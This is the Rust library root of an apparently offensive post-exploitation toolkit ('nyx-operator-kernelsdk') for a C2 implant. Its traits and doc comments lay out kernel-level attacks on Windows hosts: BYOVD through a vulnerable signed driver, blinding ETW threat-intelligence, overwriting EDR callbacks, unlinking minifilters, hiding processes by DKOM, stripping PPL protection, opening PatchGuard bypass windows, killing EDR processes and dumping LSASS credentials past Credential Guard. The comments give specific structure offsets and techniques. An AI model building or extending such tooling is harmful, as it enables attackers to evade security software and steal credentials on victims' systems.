//! nyx-operator-kernelsdk — operator-side kernel-tier kit seams (P2.2+).
//!
//! **This crate is seams-only.** Every kernel capability is a Rust trait with a
//! no-op floor default (`NoKernel`); real implementations plug in as
//! `impl Trait for …` blocks and are selected at runtime by the operator based on
//! the chosen bootstrap path (KslD / driverless CVE / DMA / BYOVD / runtime-PG).
//! Adding an impl never edits these traits or the call sites — same contract as
//! the implant-side `kits.rs` (`SleepmaskKit`/`ProcessInjectKit`).
//!
//! ## Why a separate, standalone crate
//! The PIC implant (`implant-win`) cannot host a kernel driver, so kernel-tier
//! tooling is operator-side (runs on the operator's staging host or a delivered
//! loader, not inside the beacon). It lives in its own empty `[workspace]` so
//! `cargo build --workspace` in the repo root stays green on the dev host.
//!
//! ## HVCI degradation contract
//! `KernelRw` impls MUST detect HVCI-on hosts and refuse code-page writes
//! (`KrwError::HvciCodePage`); data-section manipulation stays allowed. The
//! `KernelTier` assembler turns this into automatic fallback to the userland
//! floor when a kernel op is unavailable under HVCI.
//!
//! ## Status (2026-06)
//! ALL 10 kits have real implementations now (algorithms over `&dyn KernelRw`,
//! unit-tested with a mock; none kernel-loaded on this host):
//! - `etwti::EtwTiBlind` — ETW-TI provider blind (chase
//!   `EtwThreatIntProvRegHandle → GUID entry → EnableInfo → IsEnabled=0`).
//!   Version-forked by UBR (RTM 0x050 vs patched 0x060); HVCI-safe data write.
//! - `byovd::ByovdDriver` — BYOVD `KernelRw` over a driver IOCTL channel
//!   (`RtCore64` CVE-2019-16098 reference) + pure ntoskrnl export resolver.
//! - `telemetry::CallbackNeutralizer` — Ps*NotifyRoutine ret-stub overwrite.
//! - `telemetry::MiniFilterUnlinker` — fltmgr RegisteredFilters LIST_ENTRY unlink.
//! - `persistence::ProcessHider` — ActiveProcessLinks unlink (DKOM).
//! - `persistence::PplStripper` — EPROCESS.Protection + SignatureLevel zero.
//! - `persistence::PatchGuardWindow` — DKOM-window state machine (PG-context
//!   probe is operator-wired per build; refuses without it).
//! - `netsec::UserModeEdrSilencer` — WFP block-rule templates (FFI operator-side).
//! - `netsec::KernelLsassReader` — DTB read + page-walk orchestration shell.
//! - `netsec::EdrNeutralizer` — Kill/Freeze/Choke tiers (framework).
//!
//! **The driver LOAD step is operator-side and never runs in dev** — loading a
//! vulnerable signed driver into the kernel is irreversible (BSOD risk) +
//! Defender-flagging; reserved for the authorized target. Bootstrap priority
//! (see `docs/p2-2026-kernel-tier-deepdive.md` §0): KslD.sys (Living off the
//! Defender) > driverless CVE-2026-40369 > DMA/PCILeech > runtime-PG bypass >
//! BYOVD (fallback).

#![cfg_attr(not(test), no_std)]
#![forbid(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use alloc::boxed::Box;
use alloc::string::String;
use alloc::vec::Vec;
use core::fmt;

/// ETW-TI provider kernel blind — REAL algorithm (P2.2 §2.1). Given a working
/// `KernelRw`, chases `EtwThreatIntProvRegHandle → provider block → EnableInfo`
/// and writes `IsEnabled=0`. HVCI-safe (data section). Unit-tested with a mock
/// KernelRw; the bootstrap (BYOVD/driverless/DMA `KernelRw` impl + symbol
/// resolution) lands in Part B / the operator's chosen path.
pub mod etwti;
/// BYOVD `KernelRw` bootstrap (P2.2 §1) — CODE SHIPPED, NOT LOADED. The driver
/// IOCTL binding (`ByovdDriver` + `VulnDriverIoctl` + `RtCore64` reference) +
/// ntoskrnl symbol resolution are real and unit-tested; the driver LOAD step
/// is operator-side and never runs on this host.
pub mod byovd;
/// Version-pinned kernel structure offsets (build 17763 x64). Every constant
/// cites its source (EDRSandblast CSV / Vergilius / fluxsec.red). The kits
/// below all consume these — getting one wrong is a bugcheck, so they're
/// centralised + unit-tested here.
pub mod offsets;
/// Telemetry neutralization kits (P2.2 §2.2/§2.3): `CallbackNeutralizer`
/// (Ps*NotifyRoutine ret-stub) + `MiniFilterUnlinker` (RegisteredFilters
/// unlink). Algorithms over `&dyn KernelRw`; mock-tested.
pub mod telemetry;
/// Persistence/protection kits (P2.2 §3): `ProcessHider` (ActiveProcessLinks
/// unlink), `PplStripper` (Protection.Level zero), `PatchGuardWindow`
/// (DKOM-window state machine). Mock-tested.
pub mod persistence;
/// Network/credential/neutralize kits (P2.2 §2.4/§2.5/§4): `UserModeEdrSilencer`
/// (WFP rule templates), `KernelLsassReader` (DTB + page-walk shell),
/// `EdrNeutralizer` (Kill/Freeze/Choke tiers). Algorithm + framework.
pub mod netsec;
/// x64 4-level page-table walk (VA→PA) — pure algorithm, host-testable.
/// Used by netsec (cross-process LSASS read) + win/va_rw (kernel VA read/write).
pub mod pagewalk;
/// ntoskrnl pattern scan (byte-signature → RVA) — pure algorithm, host-testable.
/// The fallback offset resolver for unknown builds.
pub mod pattern_scan;
/// Windows-specific kernel-tier shells (BYOVD/KslD/DMA `KernelRw` impls +
/// symbol resolution). Empty for now — algorithms live in the sibling modules;
/// this is where the Windows-only bootstrap lands.
#[cfg(target_os = "windows")]
pub mod win;

// ---- Errors ---------------------------------------------------------------

/// Failure of a kernel R/W primitive (the foundation every other kit builds on).
#[derive(Debug)]
#[non_exhaustive]
pub enum KrwError {
    /// HVCI is on and the target address is a code page — EPT makes it read-only,
    /// a write would VM-exit → bugcheck. Impl must refuse and let the tier
    /// degrade to the userland floor rather than crash the host.
    HvciCodePage,
    /// Structure offset could not be resolved at runtime (version mismatch).
    /// Impls MUST resolve offsets dynamically (e.g. via ntoskrnl-metadata style
    /// RVA chasing); hardcoding is a bug.
    UnresolvedOffset(&'static str),
    /// Bootstrap primitive not available on this host (driver blocked, no DMA
    /// hardware, CVE patched, …).
    Unavailable(&'static str),
    /// Partial transfer; `ok` is how many bytes actually moved.
    Partial { ok: usize },
    /// Impl-specific diagnostic.
    Other(String),
}

/// Failure of a higher-level kit (callback/minifilter/WFP/PG/PPL/cred).
#[derive(Debug)]
#[non_exhaustive]
pub enum KitError {
    /// Depends on a KernelRw that is not present / failed.
    NoPrimitive(KrwError),
    /// Operation not supported in the current HVCI/PG/SKPG posture.
    UnsupportedPosture(&'static str),
    /// Nothing to act on (e.g. no EDR callbacks found).
    NotFound,
    Other(String),
}

impl fmt::Display for KrwError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::HvciCodePage => f.write_str("HVCI-on: code page is EPT read-only"),
            Self::UnresolvedOffset(s) => write!(f, "unresolved kernel offset: {s}"),
            Self::Unavailable(s) => write!(f, "kernel primitive unavailable: {s}"),
            Self::Partial { ok } => write!(f, "partial kernel transfer ({ok} bytes)"),
            Self::Other(s) => f.write_str(s),
        }
    }
}
impl fmt::Display for KitError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NoPrimitive(e) => write!(f, "kernel primitive error: {e}"),
            Self::UnsupportedPosture(s) => write!(f, "unsupported posture: {s}"),
            Self::NotFound => f.write_str("nothing to act on"),
            Self::Other(s) => f.write_str(s),
        }
    }
}
impl From<KrwError> for KitError {
    fn from(e: KrwError) -> Self {
        Self::NoPrimitive(e)
    }
}

// ---- §1 KernelRw: the foundation ------------------------------------------

/// Arbitrary kernel read/write. Every other kit takes `&dyn KernelRw`.
///
/// Planned impls: `ByovdDriver`, `DmaPciLeech`, `DriverlessCve` (CVE-2026-40369),
/// `LivingOffDefender` (KslD.sys), `Cr3Ioctl`.
pub trait KernelRw: Send + Sync {
    /// Read `dst.len()` bytes from kernel VA `kaddr`. Offsets are resolved at
    /// runtime by the impl — never hardcoded.
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError>;

    /// Write `src` to kernel VA `kaddr`. Data sections only under HVCI; a code
    /// page write returns `KrwError::HvciCodePage` (impl MUST probe, not crash).
    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError>;

    /// Convenience: read a little-endian u64 (default over `kread`).
    fn kread_u64(&self, kaddr: usize) -> Result<u64, KrwError> {
        let mut b = [0u8; 8];
        self.kread(kaddr, &mut b)?;
        Ok(u64::from_le_bytes(b))
    }

    /// Convenience: write a little-endian u64 (default over `kwrite`).
    fn kwrite_u64(&self, kaddr: usize, val: u64) -> Result<(), KrwError> {
        self.kwrite(kaddr, &val.to_le_bytes())
    }
}

// ---- §2 Telemetry neutralization ------------------------------------------

/// §2.1 — ETW-TI blind. Single QWORD write to `ProviderEnableInfo.IsEnabled=0`
/// after chasing `nt!EtwThreatIntProvRegHandle → +0x020 → +0x060`. HVCI-safe
/// (data section).
pub trait EtwTiKit {
    /// Blind the ETW-TI provider. Idempotent.
    fn blind(&self, krw: &dyn KernelRw) -> Result<(), KitError>;
    /// Self-check: is the provider currently disabled? (Sanctum/Peregrine probe
    /// `ProviderEnableInfo` integrity, so an impl may also forge "still enabled".)
    fn is_blinded(&self, krw: &dyn KernelRw) -> Result<bool, KitError>;
}

/// §2.2 — Ps/Ob/Cm kernel callbacks. Overwrite with a KCFG-compliant `ret`-only
/// stub (NEVER null — PatchGuard bugchecks on null callback entries). The
/// "repurpose" variant redirects to an attacker routine instead of a ret-stub.
pub trait CallbackKit {
    /// Enumerate EDR callbacks and overwrite each with a ret-stub. Returns the
    /// count neutralized.
    fn neutralize(&self, krw: &dyn KernelRw) -> Result<usize, KitError>;
    /// Stealthier variant: point callbacks at `redirect` (a legitimate-looking
    /// routine) so they still fire but no-op for the EDR.
    fn repurpose(&self, krw: &dyn KernelRw, redirect: usize) -> Result<(), KitError>;
}

/// §2.3 — MiniFilter unlink from the FltGlobals list. Bypasses kCFG (kCFG
/// guards dispatch tables, not list links). HVCI-safe.
pub trait MiniFilterKit {
    fn detach_edr(&self, krw: &dyn KernelRw) -> Result<(), KitError>;
}

/// §2.4 — WFP. Two impls planned: `UserModeEdrSilencer` (admin, no driver,
/// leaves Event ID 5447 + packet-drop traces) and `KernelCalloutOverwrite`.
/// A third, lower-noise path — QoS starvation via `EDRChoker` (`pacer.sys`,
/// below WFP) — lives in `EdrNeutralizeKit::Choke`.
pub trait WfpKit {
    fn silence_edr(&self, edr_pids: &[u32]) -> Result<(), KitError>;
}

/// §2.5 — EDR process neutralization. Three noise tiers.
pub enum NeutralizeMethod {
    /// Kernel `ZwTerminateProcess` (bypasses PPL). Highest noise + finality.
    Kill,
    /// WerFaultSecure + MiniDumpWriteDump "coma" (user-mode, bypasses PPL, admin).
    Freeze,
    /// EDRChoker QoS throttle to 8 bit/s via `pacer.sys` (user-mode, admin,
    /// lowest noise — no WFP/packet-drop traces).
    Choke,
}
pub trait EdrNeutralizeKit {
    fn neutralize(&self, pid: u32, m: NeutralizeMethod) -> Result<(), KitError>;
}

// ---- §3 Persistence / protection ------------------------------------------

/// §3.1/3.2 — PatchGuard-aware unchecked window. Two impls: `RuntimePgBypass`
/// (kurasagi / TheiaPg class, Win11 24H2-25H2) and `OutflankTimingRepair`
/// (data-only DKOM + repair in the terminate callback before PspProcessDelete).
/// The returned guard's `Drop` repairs / re-arms — do not leak it.
pub trait PatchGuardKit {
    fn enter_unchecked(&self, krw: &dyn KernelRw) -> Result<PgGuard<'_>, KitError>;
}

/// RAII guard: the unchecked window is open while it lives; `Drop` repairs.
/// Borrows the kit so it cannot be dropped mid-window.
#[must_use = "the PG guard repairs on Drop; leaking it leaves the kernel tampered"]
pub struct PgGuard<'a> {
    _kit: &'a dyn PatchGuardKit,
}
impl<'a> Drop for PgGuard<'a> {
    fn drop(&mut self) {
        // Impl-specific repair / re-arm hook. The default is a no-op so the
        // floor (`NoKernel`) compiles; real impls override via a stored fn.
    }
}

/// §3.2 — Hide a process via EPROCESS.ActiveProcessLinks unlink under a PG guard.
pub trait ProcHideKit {
    fn hide(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError>;
}

/// §3.3 — PPL, both directions: attack an EDR PPL process, or promote our own
/// process to PPL ("Process Immortality" — un-killable / un-dumpable).
pub trait PplKit {
    fn attack_edr_ppl(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError>;
    fn make_immortal(&self, pid: u32) -> Result<(), KitError>;
}

// ---- §4 Credentials -------------------------------------------------------

/// §4 — Kernel-mode credential access: read LSASS memory directly via the
/// kernel primitive, bypassing RunAsPPL + Credential Guard. (Current Nyx
/// `hashdump` is user-mode SAM-hive; this is its kernel-tier upgrade.)
pub trait CredKit {
    /// Dump LSASS memory for `pid`; returns the raw minidump bytes.
    fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError>;
}

// ---- §5 Floor default -----------------------------------------------------

/// No-op floor for every kit. Used when no kernel primitive is available
/// (HVCI-on with no data-section path, operator declined kernel tier, …) so
/// the `KernelTier` still assembles and degrades cleanly to the userland floor.
pub struct NoKernel;

impl KernelRw for NoKernel {
    fn kread(&self, _kaddr: usize, _dst: &mut [u8]) -> Result<(), KrwError> {
        Err(KrwError::Unavailable("NoKernel floor"))
    }
    fn kwrite(&self, _kaddr: usize, _src: &[u8]) -> Result<(), KrwError> {
        Err(KrwError::Unavailable("NoKernel floor"))
    }
}
impl EtwTiKit for NoKernel {
    fn blind(&self, _krw: &dyn KernelRw) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
    fn is_blinded(&self, _krw: &dyn KernelRw) -> Result<bool, KitError> {
        Ok(false)
    }
}
impl CallbackKit for NoKernel {
    fn neutralize(&self, _krw: &dyn KernelRw) -> Result<usize, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
    fn repurpose(&self, _krw: &dyn KernelRw, _redirect: usize) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl MiniFilterKit for NoKernel {
    fn detach_edr(&self, _krw: &dyn KernelRw) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl WfpKit for NoKernel {
    fn silence_edr(&self, _edr_pids: &[u32]) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl EdrNeutralizeKit for NoKernel {
    fn neutralize(&self, _pid: u32, _m: NeutralizeMethod) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl PatchGuardKit for NoKernel {
    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<PgGuard<'_>, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl ProcHideKit for NoKernel {
    fn hide(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl PplKit for NoKernel {
    fn attack_edr_ppl(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
    fn make_immortal(&self, _pid: u32) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl CredKit for NoKernel {
    fn dump_lsass(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<Vec<u8>, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}

// ---- §6 Assembled tier ----------------------------------------------------

/// An engagement's kernel tier, assembled at runtime after the operator picks a
/// bootstrap path. `rw` is required; the rest are optional and degrade to
/// `NoKernel`-equivalent behavior when `None`.
pub struct KernelTier {
    pub rw: Box<dyn KernelRw>,
    pub etw_ti: Option<Box<dyn EtwTiKit>>,
    pub callbacks: Option<Box<dyn CallbackKit>>,
    pub minifilter: Option<Box<dyn MiniFilterKit>>,
    pub wfp: Option<Box<dyn WfpKit>>,
    pub pg: Option<Box<dyn PatchGuardKit>>,
    pub hide: Option<Box<dyn ProcHideKit>>,
    pub ppl: Option<Box<dyn PplKit>>,
    pub cred: Option<Box<dyn CredKit>>,
}

impl KernelTier {
    /// Floor tier: no kernel primitive. Every op degrades to the userland floor.
    pub fn floor() -> Self {
        Self {
            rw: Box::new(NoKernel),
            etw_ti: None,
            callbacks: None,
            minifilter: None,
            wfp: None,
            pg: None,
            hide: None,
            ppl: None,
            cred: None,
        }
    }
}
